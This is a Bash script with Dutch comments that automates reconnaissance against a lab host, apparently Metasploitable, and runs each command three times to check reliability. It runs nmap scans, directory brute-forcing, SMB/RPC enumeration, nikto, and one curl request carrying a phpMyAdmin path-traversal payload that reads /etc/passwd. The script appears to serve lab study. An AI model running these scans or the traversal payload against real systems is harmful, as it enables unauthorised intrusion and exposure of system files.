#!/bin/bash

# Script om reconnaissance-commando's to automatiseren als controlole op betrouwbaarheid

OUTPUT_DIR="recon_results"
mkdir -p "$OUTPUT_DIR"

ERROR_LOG="$OUTPUT_DIR/error_log.txt"
touch "$ERROR_LOG"

TARGET="192.168.56.11"
TIMEOUT=400

# commandos per categorie (gebaseerd op exel,exclusief interactieve commandos)
declare -A COMMANDS=(
    ["Netwerk- en Hostontdekking"]="netdiscover -i eth0
fping -a -g 192.168.56.0/24
dig metasploitable.localdomain
dig @$TARGET version.bind txt chaos"

    ["Poort- en Service-analyse"]="nmap -sS -sV -O -T4 $TARGET
nmap -p- $TARGET
nmap -sT $TARGET
nmap -sU -p 53,69,161 $TARGET
nmap -sA $TARGET
wafw00f http://$TARGET/
nmap --script=http-open-proxy -p80 $TARGET
nmap -sV -p 3306,5432,8180 $TARGET --script=banner
nmap -sV -O --version-all $TARGET
telnet $TARGET 23
nmap -sT -p 21-25,80,445,3306 $TARGET --reason"

    ["Web Reconnaissance"]="whatweb http://$TARGET
whatweb --log-object @ http://$TARGET
curl -I http://$TARGET/
nmap --script=http-methods,http-enum,http-headers,http-title -p80 $TARGET
wget http://$TARGET/index.php -O index.html
gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirb/common.txt
dirb http://$TARGET/
dirsearch -u http://$TARGET -e .php,.bak,.orig
ffuf -u http://$TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401,403
feroxbuster -u http://$TARGET -x php,bak,old
curl -s http://$TARGET/phpMyAdmin/
curl -v \"http://$TARGET/phpMyAdmin/index.php?target=db_sql.php%253f/../../../../../../etc/passwd\"
curl http://$TARGET/mutillidae/
curl http://$TARGET/dvwa/login.php
curl http://$TARGET/twiki/bin/view
wget http://$TARGET/phpMyAdmin/readme -O readme.txt
joomscan --url http://$TARGET"

    ["Protocol- en Service-enumeratie"]="nmap --script=smb-enum-shares.nse -p445 $TARGET
smbclient -L \\\\$TARGET -N
smbclient -L //$TARGET -U ''
enum4linux -U $TARGET
enum4linux -a $TARGET
enum4linux -P $TARGET
rpcclient -U \"\" $TARGET
showmount -e $TARGET
nmap -sU -p 161 --script=snmp-info $TARGET
rpcinfo -p $TARGET
curl -v -l ftp://$TARGET/
telnet $TARGET 25
nmap -p110,143,993,995 -sV $TARGET
nmap -p5900 --script=vnc-info $TARGET"

    ["Kwetsbaarheidsscanning"]="nikto -h http://$TARGET/"
)

for CATEGORY in "${!COMMANDS[@]}"; do
    echo "***"
    echo "Automatiseren van categorie: $CATEGORY"
    echo "***"

    OUTPUT_FILE="$OUTPUT_DIR/${CATEGORY// /_}.txt"
    echo "Resultaten voor $CATEGORY" > "$OUTPUT_FILE"
    echo "Gestart op: $(date)" >> "$OUTPUT_FILE"
    echo "----------------------------------------" >> "$OUTPUT_FILE"

    while IFS= read -r CMD; do
        if [[ -n "$CMD" ]]; then
            echo "  Uitvoeren van commando: $CMD" | tee -a "$OUTPUT_FILE"
            for RUN in {1..3}; do
                echo "Run $RUN van 3" >> "$OUTPUT_FILE"
                echo "Tijd: $(date)" >> "$OUTPUT_FILE"
                
                { time timeout $TIMEOUT bash -c "$CMD" 2>> "$ERROR_LOG" ; } >> "$OUTPUT_FILE" 2>&1
                if [[ $? -eq 124 ]]; then
                    echo "Commando afgebroken: time-out na $TIMEOUT seconden" | tee -a "$OUTPUT_FILE" "$ERROR_LOG"
                fi
                echo "----------------------------------------" >> "$OUTPUT_FILE"
                sleep 2
            done
        fi
    done <<< "${COMMANDS[$CATEGORY]}"

    echo "Categorie $CATEGORY voltooid. Resultaten opgeslagen in $OUTPUT_FILE"
done

if [[ -s "$ERROR_LOG" ]]; then
    echo "Fouten gedetecteerd. Controleer $ERROR_LOG voor details."
else
    echo "Geen fouten gedetecteerd."
fi